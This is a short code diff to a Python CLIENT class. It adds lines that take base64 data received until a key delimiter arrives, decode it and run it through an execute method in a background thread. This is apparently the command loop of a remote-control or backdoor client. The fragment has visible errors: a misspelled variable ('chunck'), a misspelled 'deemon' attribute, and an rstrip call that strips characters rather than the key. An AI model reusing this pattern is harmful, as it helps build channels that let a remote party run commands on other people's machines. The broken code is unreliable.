@@ -113,6 +113,8 @@ class CLIENT:
             data += chunk.decode('utf-8')
 
             if self.KEY.encode('utf-8') in chunck:
+                data = data.rstrip(self.KEY)
+                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                 t.deemon = True
                 t.start()
                 data = ""
